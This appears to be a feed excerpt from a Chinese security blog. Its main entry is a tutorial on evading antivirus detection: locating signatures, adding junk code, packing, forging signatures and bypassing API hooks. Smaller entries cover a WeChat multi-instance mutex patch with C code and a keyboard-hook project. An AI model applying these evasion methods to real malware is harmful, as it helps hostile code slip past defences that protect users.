title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h1&gt;&lt;p&gt;最近，WannaCry是火了一把，到处都是分析文章，报告，解决方案等等。&lt;/p&gt; &lt;p&gt;趁着这个热度，我也来跟风一把。&lt;/p&gt; &lt;p&gt;前前后后把WannaCry详细分析了一遍。&lt;/p&gt; &lt;p&gt;从文件释放、启动加密器、文件加密策略、加密算法、到解密过程中所有细节进行了详尽深入的分析。&lt;/p&gt;          </summary>            <category term="Security" scheme="https://anhkgg.github.io/categories/Security/"/>                 <category term="wannacry" scheme="https://anhkgg.github.io/tags/wannacry/"/>            <category term="比特币病毒" scheme="https://anhkgg.github.io/tags/%E6%AF%94%E7%89%B9%E5%B8%81%E7%97%85%E6%AF%92/"/>            <category term="逆向分析" scheme="https://anhkgg.github.io/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>            <category term="样本分析" scheme="https://anhkgg.github.io/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>            <category term="locky" scheme="https://anhkgg.github.io/tags/locky/"/>        </entry>      <entry>     <title>免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)</title>     <link href="https://anhkgg.github.io/aanti-virus/"/>     <id>https://anhkgg.github.io/aanti-virus/</id>     <published>2017-05-22T00:07:45.000Z</published>     <updated>2017-05-22T00:14:21.388Z</updated>          <content type="html"><![CDATA[<h1 id="00-概述"><a href="#00-概述" class="headerlink" title="00. 概述"></a>00. 概述</h1><p>什么是免杀？来自百科的注解：</p> <blockquote> <p>免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。</p> </blockquote> <p>有本比较有名的书，想详细学习的同学可以去看看。《黑客免杀攻防》</p> <blockquote> <p>其实我大概好像只看过目录…( ╯□╰ )</p> </blockquote> <p>下面我介绍的是自己实践的一些方法，有没有效果，试试就知道了。</p> <a id="more"></a> <h1 id="01-简介"><a href="#01-简介" class="headerlink" title="01. 简介"></a>01. 简介</h1><p>免杀大概可以分为两种情况：</p> <ol> <li>二进制的免杀（无源码），只能通过通过修改asm代码／二进制数据／其他数据来完成免杀。</li> <li>有源码的免杀，可以通过修改源代码来完成免杀，也可以结合二进制免杀的技术。</li> </ol> <p>免杀也可以分为这两种情况：</p> <ol> <li>静态文件免杀，被杀毒软件病毒库/云查杀了，也就是文件特征码在病毒库了。免杀方式可能是上面的两种方式，看情况。</li> <li>动态行为免杀，运行中执行的某些行为被杀毒软件拦截报读。行为免杀如果没有源码就不是很好搞了。</li> </ol> <p>下面就静态和动态免杀来详细说说免杀的技术。</p> <h1 id="02-静态免杀"><a href="#02-静态免杀" class="headerlink" title="02. 静态免杀"></a>02. 静态免杀</h1><p>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p> <p>杀毒是提取文件一段特征码来识别病毒文件。</p> <blockquote> <p>能识别一个程序是一个病毒的一段不大于64字节的特征串</p> </blockquote> <p>那杀毒软件是怎么提取文件特征码的？</p> <p>如果我们知道了一个文件是病毒，那么通过md5肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接md5肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做模糊哈希（<code>Fuzzy Hashing</code>）算法的东西。</p> <blockquote> <p>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p> </blockquote> <p>大致就可以理解为，不要把一个文件的所有内容都拿来计算hash，而通过分片，取出部分重要（不易改变）的内容进行hash计算，这样就能达到通过一个特征码找到类似的病毒变种。</p> <p>关于模糊哈希更加详细的内容可以查看文章后面的参考文章，这里不再详述。</p> <p>具体杀毒软件是不是通过这个算法来计算特征码的，我也不能完全肯定（纯猜测加网上一点点信息），但是根据免杀的经验可以总结出几点：</p> <ol> <li>特征码会有多个串组合（减少误报）</li> <li>代码数据（肯定有）</li> <li>会解析PE，检查附加文件数据、PE文件的资源等等</li> </ol> <h2 id="1-怎么找特征码"><a href="#1-怎么找特征码" class="headerlink" title="1. 怎么找特征码"></a>1. 怎么找特征码</h2><h3 id="工具查找"><a href="#工具查找" class="headerlink" title="工具查找"></a>工具查找</h3><p>常见的特征码定位工具有CCL、MYCCL。工具大致原理就是分割文件，某些分割部分填入数据(0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之前局别是使用的分割算法不同，查找特征码的效果不同。</p> <blockquote> <p>目前比较常有名气的特征码定位器主要有CCL与MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p> </blockquote> <p>后来出来了一款新的特征码定位软件<code>VirTest</code>。下面是作者自己的介绍：</p> <blockquote> <p>我们可以这样假设报毒过程，如果检测文件是PE,如果在CODE位置存在 标志A,在DATA位置存在标志B,在资源位置存在标志C,同时满足这个3个条件，那么杀软就会报毒,VIRTEST工作原理就是要找到引起报毒最后一个标志，也就是假设中的标志C。</p> <p>因此VIRTEST采用2分排除法，测试标志C所在文件中的位置，由于被杀的文件可能存在多个 类似于ABC这样的连锁条件，所以我们必须要通过一种排除机制，先要找最靠近文件前部的连锁条件，排除掉文件尾部数据，当找到第一个连锁条件后，抹掉引标志C，再恢复尾部数据，</p> <p>然后继续测试另外的连锁条件，直到找到最后一个连锁条件，抹掉后，整个文件免杀了，则说明特征代码被定为完毕了，所以VIRTEST绝对可以精确的定位出所有的复合特征。这比文件分块定位法先进得多，更为科学。</p> </blockquote> <p>工具查找肯定是针对二进制文件（有源码的也编译后在检查）。</p> <p>具体用过MYCCL（使用方法自行查找），确实比手工分割文件定位方便，也可以找到某些文件的特征码，但是有些时候可能会出现非常多非常多…的被杀文件分割，然后…崩溃了。</p> <p>后来也用了virtest，感觉作者说的挺有道理，应该挺好用吧。然后试了试，确实感觉比MYCCL高大上多了，也可以定位到特征码，但是tmd改了之后怎么还是报呢，反正你可能会折腾很久…</p> <h3 id="手工查找"><a href="#手工查找" class="headerlink" title="手工查找"></a>手工查找</h3><p>这里说的是针对有源码的（二进制就别想手工了…），方法非常简单。</p> <ol> <li>mian中屏蔽所有代码，编译，扫描。不报的话继续2，如果依然报毒，去5。</li> <li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复2。直到定位到某个函数或者多个函数，进入3。</li> <li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复2。</li> <li>直到定位某段代码（无自定义内部调用），特征码在此。</li> <li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从1开始。如果没有，那去找找PE头吧。</li> </ol> <p>大致流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1. sub1 //未报</div><div class="line">2. sub1 sub2 //未报</div><div class="line">3. sub1 sub2 sub3 //报</div><div class="line">4. sub1 sub2 sub3(sub31) //未报</div><div class="line">5. sub1 sub2 sub3(sub31 sub32) //报</div><div class="line">6. sub1 sub2 sub3(sub31 sub32(sub321)) //报</div><div class="line">...</div><div class="line">直到找到某API调用，或者逻辑代码（没有自定义函数调用）</div></pre></td></tr></table></figure> <p>此方法，虽然笨，但是定位特征码不会很慢，挺准确。</p> <h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>别找了，直接盲免杀吧（后面具体看，有效）</p> <h2 id="2-怎么免杀？"><a href="#2-怎么免杀？" class="headerlink" title="2. 怎么免杀？"></a>2. 怎么免杀？</h2><p>前面已经找到特征码了，怎么免杀呢？</p> <p>其实前面已经说到了，找到特征码之后，只要改变这个特征码值得话就免杀成功。如果不需要软件正常运行，直接填零得了…开玩笑，这怎么可能。所以修改特征码还得保证软件正常功能。所以也是有讲究的。</p> <p>常用的修改工具有，OD，C32ASM，UE，010Editor等等。</p> <h3 id="手工修改"><a href="#手工修改" class="headerlink" title="手工修改"></a>手工修改</h3><h4 id="非源码"><a href="#非源码" class="headerlink" title="非源码"></a>非源码</h4><p><strong>1. 数据</strong></p> <p>如果特征码定位到数据（通过IDA/OD等确认），其实不好修改，稍微不慎就会导致程序不能运行，或者影响程序运行流程或结果。</p> <ul> <li>字符串，如果不影响程序逻辑，可以替换大小写；如果无关紧要的数据，随意替换；等等，看情况而定。</li> <li>整数，如果不影响结果，替换值，清零等等操作。</li> <li>地址，基本应该不能修改，具体看情况。</li> <li>PE头数据，根据PE结构具体来看，无用数据清零或修改，有用数据看情况修改。</li> <li>最后，终极修改方法，找到访问数据的代码，直接修改代码访问数据的地址，数据也可以放到其他地址了，其实就如同修改源码一样修改，肯定没有修改源码那么容易（见后）。</li> </ul> <p>反正特征码定位到数据位置不容易修改（可以再试试后面的盲免杀）。</p> <p><strong>2. 代码</strong></p> <p>如果特征码定位到代码（也通过IDA/OD等确认），在不改变程序功能基础上，应用各种方法修改。</p> <ul> <li>等价替换汇编代码，如mov eax，0可以换成xor eax，eax，直接结果相同，二进制代码不同。</li> <li>交换代码顺序，在不影响逻辑的情况下。</li> <li>代码块移位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址。</li> </ul> <h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>在有源码的情况下，修改的方式就更灵活了，更简单了。</p> <ul> <li><p>如果特征码是数据，那么修改数据位置，访问数据的代码位置等（思想类比非源码方式）。</p> </li> <li><p>加花指令，这是最有效也是最常用的方式，要点在于如何加话指令。</p> </li> </ul> <ol> <li>加数据计算代码，加减乘除各类组合。</li> <li>加字符串操作代码，增加、删除、查找、替换等。</li> <li>加多层跳转，跳转间加无效指令（不会执行的）。</li> <li>加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等。</li> <li>等等。</li> </ol> <h3 id="工具免杀（盲免杀）"><a href="#工具免杀（盲免杀）" class="headerlink" title="工具免杀（盲免杀）"></a>工具免杀（盲免杀）</h3><p>在没找到有效的特征码，或者不好修改的时候，可以试试这种方式。</p> <h4 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h4><p><strong>1. 加资源</strong></p> <p>使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。</p> <p><strong>2. 替换资源</strong></p> <p>使用ResHacker替换无用的资源（Version等）。</p> <p><strong>3. 加签名</strong></p> <p>使用签名伪造工具，将正常软件的签名信息加入到自己软件中。</p> <p>几种方式可以交替重复多次进行组合使用。</p> <h4 id="PE操作"><a href="#PE操作" class="headerlink" title="PE操作"></a>PE操作</h4><p><strong>1. PE优化</strong></p> <p>使用PE优化工具对文件进行优化，删除0，PE头优化，附加数据等。</p> <p><strong>2. 增加节</strong></p> <p>增加节数据，随意加入无效数据。</p> <h4 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h4><p>可以将加壳简单理解为：解密器/解压器+加密器/压缩器（原始代码）。</p> <p>通过加密器/压缩器将原始代码进行加密压缩，让其特征码变化隐藏，然后组装上解密器/解压器到文件中，运行是先运行解密/解压器，将加密压缩内容解密解压，然后继续运行原始代码。</p> <p><strong>1. 加冷门壳</strong></p> <p>壳也有特征，知名壳都已经被分析的非常多了，杀软基本都能查这类壳，或者自动脱壳，然后进行查杀。</p> <p>所以加冷门壳，壳特征未被分析，不能自动脱壳，可以更好隐藏原始代码，得到免杀效果。</p> <p><strong>2. 加壳改壳</strong></p> <p>将常用壳进行修改，让壳特征变化，也可以是杀软失效。</p> <p>比如修改入口，区段信息修改，入口代码移位。</p> <p>可以类比为免杀壳，上面介绍的方法都可以使用。</p> <h1 id="03-行为动态免杀"><a href="#03-行为动态免杀" class="headerlink" title="03. 行为动态免杀"></a>03. 行为动态免杀</h1><p>杀毒软件现在都会有主防的功能，对恶意行为进行拦截提示。</p> <p>比如这些行为：</p> <ol> <li>注册表操作，添加启动项，添加服务</li> <li>文件写入、读系统文件、删除文件，移动文件</li> <li>杀进程，创建进程</li> <li>注入、劫持等</li> </ol> <h2 id="行为拦截原理"><a href="#行为拦截原理" class="headerlink" title="行为拦截原理"></a>行为拦截原理</h2><p>说白了，恶意行为都是通过API调用来完成的，可能是一个API，可能是多个APi组合。</p> <p>杀软通过技术手段拦截这些API调用，通过策略来判断是否属于恶意行为。</p> <p>关键点：</p> <ol> <li>API</li> <li>策略（顺序，调用源，参数等等）</li> </ol> <p>所以后面的方法就是针对这两点做的工作。</p> <h2 id="如何进行行为免杀呢？"><a href="#如何进行行为免杀呢？" class="headerlink" title="如何进行行为免杀呢？"></a>如何进行行为免杀呢？</h2><p>下面介绍的方式对非源码、源码都有效，但是非源码修改起来非常非常麻烦…</p> <p><strong>1. 替换api</strong></p> <p>使用相同功能的API进行替换，杀软不可能拦截了所有API，所以这种方式还是有效的。比如MoveFileEx替换MoveFile。</p> <p><strong>2. 未导出api</strong></p> <p>寻找相同功能的未导出API进行替换，杀软拦截一般是导出API，或者底层调用，寻找未导出API有一定效果。</p> <p>寻找方法，通过分析目标API内部调用，找到内部一个或多个未导出API，来完成相同功能。</p> <p><strong>3. 重写api</strong></p> <p>完全重写系统API功能（通过逆向），实现自己的对应功能API，对于ring3的行为拦截非常有效。比如实现MoveFile等。</p> <p><strong>4. api+5</strong></p> <p>ring3的API拦截通过是挂钩API头几个字节内容，然后进入杀软自己函数进行参数检查之类的。</p> <p>那么如果调用API时，跳过头部几字节，就可以避开这种拦截方式。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__API:</div><div class="line">1 push ebp;</div><div class="line">2 mov ebp, esp;</div><div class="line">3 mov edi, edi;</div><div class="line">4 ...</div></pre></td></tr></table></figure> <p>调用时，不适用1地址，而使用4地址，然后自己函数内部还原跳过几字节的调用。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__API_MY:</div><div class="line">push ebp;</div><div class="line">mov ebp, esp;</div><div class="line">mov edi, edi;</div><div class="line">call 4</div></pre></td></tr></table></figure> <p><strong>5. 底层api</strong></p> <p>该方法类似于2和3，杀软拦截API可能更加高层（语义更清楚），那就可以找更底层API进行调用，绕过拦截，比如使用NT函数。</p> <p>或者通过DeviceIoControl调用驱动功能来完成API功能。</p> <p>模拟系统调用。</p> <p><strong>6. 合理替换调用顺序</strong></p> <p>有时拦截行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软拦截策略，也可以绕过改行为拦截。</p> <p>比如，先创建服务，再将服务对应文件拷贝过去。</p> <p><strong>7. 绕过调用源</strong></p> <p>通过调用其它进行功能来完成API的功能。比较经典的如，通过rundll32.exe来完成dll加载，通过COM来操作文件等等。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>方法大概就总结到这，要更好的完成免杀，需要各种方式进行合理灵活组合变化，或者挖掘更多的方法。</p> <h2 id="注意-技巧"><a href="#注意-技巧" class="headerlink" title="注意/技巧"></a>注意/技巧</h2><ol> <li>非源码修改时，通过OD能够更好的完成，配合IDA进行观察，具体参考OD/IDA使用教程。</li> <li>源码免杀加花，要灵活多变，不拘于形式。</li> <li>行为免杀多尝试，猜出杀软拦截策略，能够更有效的找到绕过方式。</li> </ol> <blockquote> <p>道高一尺，魔高一丈</p> </blockquote> <p>各路大神有更多的技巧和方式，请不吝赐教，相互交流。</p> <p>我们不做坏事，但是可以了解做坏事的手段，更好的破坏防御这些手段。</p> <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol> <li><a href="http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818" target="_blank" rel="external">模糊哈希算法的原理与应用</a></li> <li><a href="http://www.freebuf.com/sectool/40580.html" target="_blank" rel="external">VirTest5.0特征码定位器（开源）</a></li> <li><a href="http://baike.baidu.com/link?url=ExY1OF52Md1Lk6G_WMZQf4fdswE2RSjuhPmXEYRwgVhkSIb-udf0AhK1cqbhmnDsnf21pUJSvHEWnMoxwZfZ5asnxw0W76Ew9t5ZIJRbLxO" target="_blank" rel="external">http://baike.baidu.com/link?url=ExY1OF52Md1Lk6G_WMZQf4fdswE2RSjuhPmXEYRwgVhkSIb-udf0AhK1cqbhmnDsnf21pUJSvHEWnMoxwZfZ5asnxw0W76Ew9t5ZIJRbLxO</a></li> </ol> <p>转载请注明出处：<a href="https://anhkgg.github.io/aanti-virus">https://anhkgg.github.io/aanti-virus</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;00-概述&quot;&gt;&lt;a href=&quot;#00-概述&quot; class=&quot;headerlink&quot; title=&quot;00. 概述&quot;&gt;&lt;/a&gt;00. 概述&lt;/h1&gt;&lt;p&gt;什么是免杀？来自百科的注解：&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。&lt;/p&gt; &lt;/blockquote&gt; &lt;p&gt;有本比较有名的书，想详细学习的同学可以去看看。《黑客免杀攻防》&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;其实我大概好像只看过目录…( ╯□╰ )&lt;/p&gt; &lt;/blockquote&gt; &lt;p&gt;下面我介绍的是自己实践的一些方法，有没有效果，试试就知道了。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="Anti-AntiVirus" scheme="https://anhkgg.github.io/tags/Anti-AntiVirus/"/>            <category term="免杀" scheme="https://anhkgg.github.io/tags/%E5%85%8D%E6%9D%80/"/>            <category term="AntiVirus" scheme="https://anhkgg.github.io/tags/AntiVirus/"/>            <category term="杀毒软件" scheme="https://anhkgg.github.io/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/"/>        </entry>      <entry>     <title>微信(WeChat)电脑端多开研究+源码</title>     <link href="https://anhkgg.github.io/wechat-multi-pc/"/>     <id>https://anhkgg.github.io/wechat-multi-pc/</id>     <published>2017-05-14T07:07:51.000Z</published>     <updated>2017-05-16T15:01:04.001Z</updated>          <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>不知道大家有没有多个微信号，我反正有一两三个。</p> <p>现在电脑端微信使用频率也比较高，主要用于大文件传输，或者手机电脑文件互传等等，除了不能收红包和看朋友圈，貌似电脑端没其他毛病。</p> <p>哦，还有个毛病，只能开一个微信，只能开一个，开一个，一个…</p> <p>不管这些有的没的，今天的主题是，怎么样在电脑上开多个微信客户端！</p> <a id="more"></a> <h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>了解过单实例的同学，应该都知道大概是怎么实现的单开。</p> <p>简单说下，大都通过判断Mutex、Event、File等等是否已经存在，存在则退出当前开启进程（说明已经有一个进程了），这样也就是单实例了。</p> <p>那只要找到微信是通过什么标志来实现单实例的，然后干掉这个标志即可。</p> <p>然后…基于这个思路，我们上工具。</p> <p>使用procexp找到微信进程，然后翻了一遍句柄。</p> <p>找到疑是的一段句柄。</p> <p><img src="/img/webchat.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">\Sessions\1\BaseNamedObjects\_WeChat_App_Instance_Identity_Mutex_Name</div><div class="line">\Sessions\1\BaseNamedObjects\WeChat_GlobalConfig_Multi_Process_Mutex</div></pre></td></tr></table></figure> <p>感觉这两个都像，不管了，上pchunter，kill掉句柄试一下。</p> <p>经过尝试，发现<code>_WeChat_App_Instance_Identity_Mutex_Name</code>是单实例标志（kill句柄后可以开第二个客户端），<code>WeChat_GlobalConfig_Multi_Process_Mutex</code>没用。</p> <p>既然如此，那开始码代码吧。</p> <h1 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h1><p>可能的方案：</p> <ol> <li>找微信判断标识的代码位置，然后直接patch掉，或者整个dll进去patch。然后大致去翻了一下，貌似代码在wechatwin.dll，然后加了vmp壳，所以就不折腾这个了。</li> <li>直接通过代码kill掉这个Mutex的句柄（类似Pchunter操作），然后就可以开启第二个实例了，貌似明显更有优势啊。</li> <li>额，如果觉得无所谓，每次开之前用pchunter关一次句柄也行，下面就不用看了…</li> </ol> <p>这里选择第二个方案，开始代码。</p> <p>流程：</p> <ol> <li>枚举句柄，找到_WeChat_App_Instance_Identity_Mutex_Name的mutant</li> <li>duplicate句柄到本进程，然后close</li> <li>启动微信</li> </ol> <p>下面是主要代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">//步骤1和2的代码</div><div class="line">//获取到微信所有进程句柄</div><div class="line">DWORD Num = GetProcIds(L&quot;WeChat.exe&quot;, Pids);</div><div class="line">...</div><div class="line"></div><div class="line">Status = ZwQuerySystemInformation(SystemHandleInformation, pbuffer, 0x1000, &amp;dwSize);</div><div class="line"></div><div class="line">PSYSTEM_HANDLE_INFORMATION1 pHandleInfo = (PSYSTEM_HANDLE_INFORMATION1)pbuffer;</div><div class="line"></div><div class="line"> for(nIndex = 0; nIndex &lt; pHandleInfo-&gt;NumberOfHandles; nIndex++)</div><div class="line"> &#123;</div><div class="line">     //句柄在Pids中，就是微信进程的句柄信息</div><div class="line">  if(IsTargetPid(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, Pids, Num))</div><div class="line">  &#123;</div><div class="line">      HANDLE hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, </div><div class="line">      (HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue,</div><div class="line">      DUPLICATE_SAME_ACCESS</div><div class="line">      );</div><div class="line">      </div><div class="line">   //对象名</div><div class="line">   Status = NtQueryObject(hHandle, ObjectNameInformation, szName, 512, &amp;dwFlags);</div><div class="line">   //对象类型名</div><div class="line">   Status = NtQueryObject(hHandle,  ObjectTypeInformation, szType, 128, &amp;dwFlags);</div><div class="line">   </div><div class="line">   //找到微信的标志</div><div class="line">   if (0 == wcscmp(TypName, L&quot;Mutant&quot;))</div><div class="line">   &#123;</div><div class="line">    if (wcsstr(Name, L&quot;_WeChat_App_Instance_Identity_Mutex_Name&quot;))</div><div class="line">    &#123;</div><div class="line">        </div><div class="line">        //DUPLICATE_CLOSE_SOURCE标志很重要，不明白的查一查</div><div class="line">        hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, </div><div class="line">      (HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue,</div><div class="line">      DUPLICATE_CLOSE_SOURCE</div><div class="line">      );</div><div class="line">     if(hHandle)</div><div class="line">     &#123;</div><div class="line">      printf(&quot;+ Patch wechat success!\n&quot;);</div><div class="line">      CloseHandle(hHandle);</div><div class="line">     &#125;</div><div class="line">    &#125;</div><div class="line">   &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">步骤3的代码</div><div class="line"></div><div class="line">//通过注册表找到微信安装目录</div><div class="line">if(ERROR_SUCCESS != RegOpenKey(HKEY_CURRENT_USER, L&quot;Software\\Tencent\\WeChat&quot;, &amp;hKey))</div><div class="line">&#123;</div><div class="line"> return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD Type = REG_SZ;</div><div class="line">WCHAR Path[MAX_PATH] = &#123;0&#125;;</div><div class="line">DWORD cbData = MAX_PATH*sizeof(WCHAR);</div><div class="line">if(ERROR_SUCCESS != RegQueryValueEx(hKey, L&quot;InstallPath&quot;, 0, &amp;Type, (LPBYTE)Path, &amp;cbData))</div><div class="line">&#123;</div><div class="line"> goto __exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">PathAppend(Path, L&quot;WeChat.exe&quot;);</div><div class="line"></div><div class="line">//启动微信客户端</div><div class="line">ShellExecute(NULL, L&quot;Open&quot;, Path, NULL, NULL, SW_SHOW);</div></pre></td></tr></table></figure> <p>代码就这样，有注释，就不再啰嗦。</p> <p>完整代码，请看后面的地址。</p> <h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>一个小玩意，供大家一笑。</p> <p>编译好的可执行文件：</p> <p><a href="https://github.com/anhkgg/multi_wechat_pc/raw/master/WeChat%E5%A4%9A%E5%BC%80.exe" target="_blank" rel="external">https://github.com/anhkgg/multi_wechat_pc/raw/master/WeChat%E5%A4%9A%E5%BC%80.exe</a></p> <p>源码地址：</p> <p><a href="https://github.com/anhkgg/multi_wechat_pc" target="_blank" rel="external">https://github.com/anhkgg/multi_wechat_pc</a></p> <p>博客原文：</p> <p><a href="https://anhkgg.github.io/wechat-multi-pc">https://anhkgg.github.io/wechat-multi-pc</a></p> <p>转载请注明出处：<a href="https://anhkgg.github.io/wechat-multi-pc">https://anhkgg.github.io/wechat-multi-pc</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;不知道大家有没有多个微信号，我反正有一两三个。&lt;/p&gt; &lt;p&gt;现在电脑端微信使用频率也比较高，主要用于大文件传输，或者手机电脑文件互传等等，除了不能收红包和看朋友圈，貌似电脑端没其他毛病。&lt;/p&gt; &lt;p&gt;哦，还有个毛病，只能开一个微信，只能开一个，开一个，一个…&lt;/p&gt; &lt;p&gt;不管这些有的没的，今天的主题是，怎么样在电脑上开多个微信客户端！&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>            <category term="handle" scheme="https://anhkgg.github.io/tags/handle/"/>            <category term="patch" scheme="https://anhkgg.github.io/tags/patch/"/>        </entry>      <entry>     <title>让代码飞出一段钢琴曲(freepiano小助手)</title>     <link href="https://anhkgg.github.io/coding-piano-hook/"/>     <id>https://anhkgg.github.io/coding-piano-hook/</id>     <published>2017-05-01T07:11:42.000Z</published>     <updated>2017-05-01T07:27:41.473Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>突然想玩一下键盘弹曲子，就找到了<a href="http://freepiano.tiwb.com/cn/" target="_blank" rel="external">freepiano</a>，专业的东西不懂，就找了写简谱来玩玩，感觉挺不错的，哈哈~~</p> <p>玩疯了之后，突然想到，我平时写代码，是不是可以弹出一段曲子呢，是不是心情会变得非常好，代码也写的更有节奏呢~~</p> <p>说不定还搞出来一个什么《代码之歌》的钢琴曲~~ 嘎嘎</p> <p>突然被自己这个想法吸引住了，不管咋样，每敲下代码的一个字符，后面想起了背景音乐，真是不错的，程序员也可以是“钢琴师”啊~~</p> <p>有了想法，就开整！！！</p> <a id="more"></a> <p>有下面几点问题：</p> <ol> <li>freepiano必须是激活窗口下，才能接受键盘输入</li> <li>我要在写代码时，让freepiano响应按键，就需要全局劫持键盘输入了</li> <li>怎么给freepiano通知，我按下了什么呢？</li> </ol> <p>忘了说，freepiano长这样：<br><img src="/img/freepiano_1.png" alt="img"></p> <h1 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h1><p>先简单整理下思路：</p> <ol> <li>首先肯定是弄个键盘钩子难道全局的所有键盘输入，暂定WH_KEYBOARD</li> <li>怎么让钩子执行？弄个exe，把freepiano再启动起来，感觉麻烦，然后就想让freepiano加载我的模块吧，简单确认了一下，可行（后面具体描述）</li> <li>劫持到键盘输入之后，通过PostMessage给freepiano发送键盘消息，模拟WM_KEYDOWN/WM_KEYUP</li> </ol> <h2 id="1-加载我的模块"><a href="#1-加载我的模块" class="headerlink" title="1. 加载我的模块"></a>1. 加载我的模块</h2><p>首先想到的就是DLL劫持和修改freepiano的导入表，后者不够优雅，果断要选择dll劫持。</p> 